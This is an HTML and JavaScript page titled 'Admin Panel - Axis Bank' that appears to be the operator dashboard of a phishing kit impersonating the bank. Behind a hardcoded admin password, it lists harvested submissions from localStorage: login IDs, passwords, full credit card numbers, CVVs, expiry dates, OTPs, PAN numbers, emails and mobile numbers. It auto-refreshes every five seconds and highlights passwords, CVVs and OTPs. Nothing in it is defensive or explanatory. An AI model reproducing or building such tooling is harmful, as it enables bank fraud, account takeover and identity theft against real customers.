<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Axis Bank</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: #f0f0f0;
            min-height: 100vh;
            color: #333;
            animation: pageBlink 5s infinite;
        }
        
        @keyframes pageBlink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.98; }
        }
        
        /* Password Login */
        .login-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #87103F 0%, #2c0b0e 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .login-box {
            background: rgba(0, 0, 0, 0.6);
            padding: 30px;
            border-radius: 12px;
            width: 90%;
            max-width: 350px;
            border: 2px solid #87103F;
            box-shadow: 0 8px 25px rgba(135, 16, 63, 0.4);
        }
        
        .login-title {
            color: white;
            text-align: center;
            font-size: 24px;
            margin-bottom: 20px;
            text-shadow: 0 2px 8px rgba(255, 255, 255, 0.2);
        }
        
        .login-input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 2px solid #87103F;
            border-radius: 6px;
            background: rgba(255, 255, 255, 0.05);
            color: white;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        .login-input:focus {
            outline: none;
            border-color: #ff4757;
            box-shadow: 0 0 12px rgba(255, 71, 87, 0.3);
            background: rgba(255, 255, 255, 0.1);
        }
        
        .login-input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }
        
        .login-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #87103F 0%, #a0144a 100%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 5px;
            letter-spacing: 1px;
        }
        
        .login-btn:hover {
            background: linear-gradient(135deg, #a0144a 0%, #87103F 100%);
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(135, 16, 63, 0.6);
        }
        
        .login-error {
            color: #ff4757;
            text-align: center;
            margin-top: 12px;
            font-size: 13px;
            display: none;
            animation: shake 0.5s ease;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        
        /* Admin Panel */
        .admin-panel {
            display: none;
            padding: 0;
        }
        
        /* Header - Maroon Red */
        .panel-header {
            background: #87103F;
            color: white;
            padding: 12px 15px;
            text-align: center;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 3px 10px rgba(135, 16, 63, 0.3);
            animation: headerBlink 5s infinite;
        }
        
        @keyframes headerBlink {
            0%, 100% { background: #87103F; }
            50% { background: #a0144a; }
        }
        
        .header-title {
            font-size: 20px;
            font-weight: bold;
            letter-spacing: 1px;
        }
        
        .refresh-info {
            font-size: 11px;
            color: rgba(255, 255, 255, 0.8);
            margin-top: 3px;
        }
        
        .blink-dot {
            width: 6px;
            height: 6px;
            background: #00ff00;
            border-radius: 50%;
            display: inline-block;
            margin-right: 6px;
            animation: blink 1s infinite;
            box-shadow: 0 0 8px #00ff00;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        /* Submissions Container - Compact */
        .submissions-container {
            padding: 8px;
            max-width: 100%;
        }
        
        /* Submission Cards - Minimal Gap */
        .submission-card {
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 6px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.08);
            border-left: 4px solid;
            animation: cardEntry 0.3s ease-out;
        }
        
        @keyframes cardEntry {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* Color Variations - Minimal */
        .card-green {
            background: #e8f5e9;
            border-left-color: #4CAF50;
        }
        
        .card-maroon {
            background: #fce4ec;
            border-left-color: #87103F;
        }
        
        .card-white {
            background: #ffffff;
            border-left-color: #9e9e9e;
        }
        
        .card-blue {
            background: #e3f2fd;
            border-left-color: #2196F3;
        }
        
        /* Card Header - Compact */
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .card-type {
            font-weight: bold;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 11px;
            text-transform: uppercase;
        }
        
        .type-login {
            background: #4CAF50;
            color: white;
        }
        
        .type-credit {
            background: #2196F3;
            color: white;
        }
        
        .type-otp {
            background: #FF9800;
            color: white;
        }
        
        .type-pan {
            background: #9C27B0;
            color: white;
        }
        
        .card-time {
            font-size: 10px;
            color: #666;
        }
        
        /* Card Content - Compact Layout */
        .card-content {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 8px;
        }
        
        .data-item {
            padding: 5px 0;
        }
        
        .data-label {
            font-size: 11px;
            color: #666;
            margin-bottom: 2px;
            font-weight: 500;
        }
        
        .data-value {
            font-size: 13px;
            word-break: break-all;
            font-weight: 500;
        }
        
        /* Sensitive Data Styling */
        .data-value.password {
            color: #d32f2f;
            font-weight: bold;
            background: #ffebee;
            padding: 3px 6px;
            border-radius: 3px;
            display: inline-block;
            font-size: 14px;
        }
        
        .data-value.otp {
            color: #87103F;
            font-weight: bold;
            background: #fff3e0;
            padding: 4px 8px;
            border-radius: 3px;
            display: inline-block;
            animation: otpBlink 2s infinite;
            font-size: 15px;
            letter-spacing: 2px;
        }
        
        @keyframes otpBlink {
            0%, 100% { background: #fff3e0; }
            50% { background: #ffecb3; }
        }
        
        .data-value.card {
            color: #1565c0;
            font-family: monospace;
            background: #f5f5f5;
            padding: 3px 6px;
            border-radius: 3px;
            font-size: 13px;
        }
        
        .data-value.pan {
            color: #9C27B0;
            font-weight: bold;
            background: #f3e5f5;
            padding: 3px 6px;
            border-radius: 3px;
            display: inline-block;
            font-size: 14px;
            font-family: monospace;
        }
        
        /* No Data Message */
        .no-data {
            text-align: center;
            padding: 40px 15px;
            background: white;
            border-radius: 8px;
            border: 2px dashed #ddd;
            color: #666;
            font-style: italic;
            margin: 20px;
        }
        
        /* Mobile View Optimizations */
        @media (max-width: 768px) {
            .login-box {
                padding: 20px;
                max-width: 300px;
            }
            
            .login-title {
                font-size: 20px;
                margin-bottom: 15px;
            }
            
            .login-input {
                padding: 10px;
                font-size: 14px;
            }
            
            .login-btn {
                padding: 10px;
                font-size: 14px;
            }
            
            .panel-header {
                padding: 10px;
            }
            
            .header-title {
                font-size: 18px;
            }
            
            .refresh-info {
                font-size: 10px;
            }
            
            .submissions-container {
                padding: 5px;
            }
            
            .submission-card {
                padding: 10px;
                margin-bottom: 5px;
                border-left-width: 3px;
            }
            
            .card-content {
                grid-template-columns: 1fr;
                gap: 6px;
            }
            
            .card-header {
                margin-bottom: 8px;
            }
            
            .card-type {
                font-size: 10px;
                padding: 2px 6px;
            }
            
            .card-time {
                font-size: 9px;
            }
            
            .data-label {
                font-size: 10px;
            }
            
            .data-value {
                font-size: 12px;
            }
            
            .data-value.password,
            .data-value.otp,
            .data-value.pan {
                font-size: 13px;
                padding: 2px 5px;
            }
            
            .data-value.card {
                font-size: 12px;
            }
        }
        
        @media (max-width: 480px) {
            .submissions-container {
                padding: 3px;
            }
            
            .submission-card {
                padding: 8px;
                margin-bottom: 4px;
                border-radius: 6px;
            }
            
            .card-content {
                gap: 5px;
            }
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 6px;
        }
        
        ::-webkit-scrollbar-track {
            background: #f1f1f1;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #87103F;
            border-radius: 3px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #a0144a;
        }
    </style>
</head>
<body>
    <!-- Password Login Screen -->
    <div class="login-screen" id="loginScreen">
        <div class="login-box">
            <div class="login-title">üîê ADMIN PANEL</div>
            <input type="text" id="username" class="login-input" placeholder="Admin User ID" autocomplete="off">
            <input type="password" id="password" class="login-input" placeholder="Password" autocomplete="off">
            <button class="login-btn" onclick="login()">ENTER ADMIN PANEL</button>
            <div class="login-error" id="loginError">‚ö†Ô∏è Invalid credentials</div>
        </div>
    </div>
    
    <!-- Admin Panel -->
    <div class="admin-panel" id="adminPanel">
        <!-- Header -->
        <div class="panel-header">
            <div class="header-title">AXIS BANK</div>
            <div class="refresh-info">
                <span class="blink-dot"></span>
                Auto-refresh in: <span id="refreshTimer">5</span> seconds
            </div>
        </div>
        
        <!-- Submissions Container -->
        <div class="submissions-container" id="submissionsList">
            <div class="no-data">No submissions yet. Waiting for data...</div>
        </div>
    </div>

    <script>
        // Admin Credentials
        const ADMIN_USER = "admin";
        const ADMIN_PASS = "18322387";
        
        let refreshInterval;
        let refreshTimer = 5;
        let currentSubmissions = [];
        
        // Color classes for cards
        const cardColors = ['card-green', 'card-maroon', 'card-white', 'card-blue'];
        
        // Check login on load
        document.addEventListener('DOMContentLoaded', function() {
            const savedLogin = localStorage.getItem('axisAdminLoggedIn');
            if (savedLogin === 'true') {
                showAdminPanel();
            }
            
            // Enter key login
            document.getElementById('password').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') login();
            });
            
            document.getElementById('username').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') login();
            });
        });
        
        // Login function
        function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (username === ADMIN_USER && password === ADMIN_PASS) {
                localStorage.setItem('axisAdminLoggedIn', 'true');
                showAdminPanel();
            } else {
                const errorEl = document.getElementById('loginError');
                errorEl.style.display = 'block';
                errorEl.textContent = '‚ùå Invalid credentials!';
                setTimeout(() => errorEl.style.display = 'none', 3000);
                
                errorEl.style.animation = 'none';
                setTimeout(() => {
                    errorEl.style.animation = 'shake 0.5s ease';
                }, 10);
            }
        }
        
        // Show admin panel
        function showAdminPanel() {
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'block';
            refreshData();
            startAutoRefresh();
        }
        
        // Start auto refresh every 5 seconds
        function startAutoRefresh() {
            clearInterval(refreshInterval);
            refreshInterval = setInterval(() => {
                refreshTimer--;
                document.getElementById('refreshTimer').textContent = refreshTimer;
                
                if (refreshTimer <= 0) {
                    refreshData();
                    refreshTimer = 5;
                }
            }, 1000);
        }
        
        // Refresh data
        function refreshData() {
            const submissions = loadSubmissions();
            displaySubmissions(submissions);
            refreshTimer = 5;
        }
        
        // Load submissions from localStorage
        function loadSubmissions() {
            try {
                const submissions = JSON.parse(localStorage.getItem('axisBankSubmissions')) || [];
                currentSubmissions = submissions;
                
                // Debug log
                console.log('üìä Loading submissions from localStorage...');
                console.log('Total submissions:', submissions.length);
                
                // Count by type
                let typeCount = {};
                submissions.forEach(sub => {
                    typeCount[sub.type] = (typeCount[sub.type] || 0) + 1;
                });
                console.log('Submissions by type:', typeCount);
                
                // Check PAN submissions
                const panSubs = submissions.filter(s => s.type === 'pan');
                console.log('PAN submissions found:', panSubs.length);
                if (panSubs.length > 0) {
                    console.log('Latest PAN:', panSubs[0]);
                }
                
                return submissions;
            } catch (error) {
                console.error('‚ùå Error loading submissions:', error);
                return [];
            }
        }
        
        // Display submissions in compact vertical layout
        function displaySubmissions(submissions) {
            const container = document.getElementById('submissionsList');
            
            if (!submissions || submissions.length === 0) {
                container.innerHTML = '<div class="no-data">No submissions yet. Waiting for data...</div>';
                return;
            }
            
            // Sort by timestamp (newest first)
            submissions.sort((a, b) => {
                const timeA = a.timestamp ? new Date(a.timestamp).getTime() : 0;
                const timeB = b.timestamp ? new Date(b.timestamp).getTime() : 0;
                return timeB - timeA;
            });
            
            let html = '';
            
            submissions.forEach((sub, index) => {
                const subType = sub.type || 'unknown';
                const timeString = formatTime(sub.timestamp || sub.date);
                
                // Get data fields
                let userId = '', password = '', mobile = '', card = '', otp = '', 
                    name = '', cvv = '', expiry = '', email = '', panNumber = '';
                
                if (sub.data) {
                    // Common fields
                    userId = sub.data.loginId || sub.data.userId || sub.data.user || '';
                    email = sub.data.email || '';
                    password = sub.data.password || sub.data.pass || '';
                    mobile = sub.data.mobile || sub.data.phone || sub.data.mobileNumber || '';
                    
                    // Login specific
                    if (sub.type === 'login') {
                        name = sub.data.name || '';
                    }
                    // Credit card specific
                    else if (sub.type === 'credit') {
                        name = sub.data.name || sub.data.cardName || '';
                        card = sub.data.cardNumber || '';
                        cvv = sub.data.cvv || sub.data.cvv2 || '';
                        expiry = sub.data.expiry || sub.data.expiryDate || '';
                    }
                    // OTP specific
                    else if (sub.type === 'otp') {
                        otp = sub.data.otp || '';
                    }
                    // ‚úÖ PAN TYPE SPECIFIC
                    else if (sub.type === 'pan') {
                        panNumber = sub.data.panNumber || '';
                        name = sub.data.fullName || sub.data.name || '';
                        // Get other fields from PAN data
                        mobile = sub.data.mobile || '';
                        userId = sub.data.userId || '';
                        email = sub.data.email || '';
                        password = sub.data.password || '';
                    }
                }
                
                // Select card color based on index
                const colorClass = cardColors[index % cardColors.length];
                
                // Determine type class
                let typeClass = 'type-login';
                if (subType === 'credit') typeClass = 'type-credit';
                if (subType === 'otp') typeClass = 'type-otp';
                if (subType === 'pan') typeClass = 'type-pan';
                
                html += `
                    <div class="submission-card ${colorClass}">
                        <div class="card-header">
                            <div class="card-type ${typeClass}">${subType}</div>
                            <div class="card-time">${timeString}</div>
                        </div>
                        
                        <div class="card-content">
                            ${panNumber ? `
                            <div class="data-item">
                                <div class="data-label">PAN Number</div>
                                <div class="data-value pan">${panNumber}</div>
                            </div>` : ''}
                            
                            ${name ? `
                            <div class="data-item">
                                <div class="data-label">Name</div>
                                <div class="data-value">${name}</div>
                            </div>` : ''}
                            
                            ${userId ? `
                            <div class="data-item">
                                <div class="data-label">User ID</div>
                                <div class="data-value">${userId}</div>
                            </div>` : ''}
                            
                            ${email ? `
                            <div class="data-item">
                                <div class="data-label">Email</div>
                                <div class="data-value">${email}</div>
                            </div>` : ''}
                            
                            ${password ? `
                            <div class="data-item">
                                <div class="data-label">Password</div>
                                <div class="data-value password">${password}</div>
                            </div>` : ''}
                            
                            ${mobile ? `
                            <div class="data-item">
                                <div class="data-label">Mobile</div>
                                <div class="data-value">${mobile}</div>
                            </div>` : ''}
                            
                            ${card ? `
                            <div class="data-item">
                                <div class="data-label">Card No</div>
                                <div class="data-value card">${formatCardNumber(card)}</div>
                            </div>` : ''}
                            
                            ${cvv ? `
                            <div class="data-item">
                                <div class="data-label">CVV</div>
                                <div class="data-value password">${cvv}</div>
                            </div>` : ''}
                            
                            ${expiry ? `
                            <div class="data-item">
                                <div class="data-label">Expiry</div>
                                <div class="data-value">${expiry}</div>
                            </div>` : ''}
                            
                            ${otp ? `
                            <div class="data-item">
                                <div class="data-label">OTP</div>
                                <div class="data-value otp">${otp}</div>
                            </div>` : ''}
                        </div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
        }
        
        // Format card number with spaces
        function formatCardNumber(cardNumber) {
            if (!cardNumber) return '';
            // Remove all non-digits
            const cleaned = cardNumber.toString().replace(/\D/g, '');
            // Format as XXXX XXXX XXXX XXXX
            const parts = cleaned.match(/.{1,4}/g);
            return parts ? parts.join(' ') : cleaned;
        }
        
        // Format time - compact
        function formatTime(timestamp) {
            if (!timestamp) return '';
            
            try {
                const date = new Date(timestamp);
                return date.toLocaleTimeString('en-IN', {
                    hour: '2-digit',
                    minute: '2-digit'
                }) + ' ' + date.toLocaleDateString('en-IN', {
                    day: '2-digit',
                    month: 'short'
                });
            } catch (e) {
                return '';
            }
        }
        
        // Debug function to check localStorage
        function debugStorage() {
            console.log('=== DEBUG LOCALSTORAGE ===');
            const data = JSON.parse(localStorage.getItem('axisBankSubmissions') || '[]');
            console.log('Total items:', data.length);
            data.forEach((item, i) => {
                console.log(`${i}. Type: ${item.type}, Time: ${item.timestamp}`);
                if (item.type === 'pan') {
                    console.log('   PAN:', item.data?.panNumber);
                    console.log('   Name:', item.data?.fullName);
                }
            });
        }
        
        // Auto-logout after 60 minutes
        setTimeout(() => {
            localStorage.removeItem('axisAdminLoggedIn');
            location.reload();
        }, 60 * 60 * 1000);
        
        // Initial debug
        setTimeout(debugStorage, 1000);
    </script>
</body>
</html>
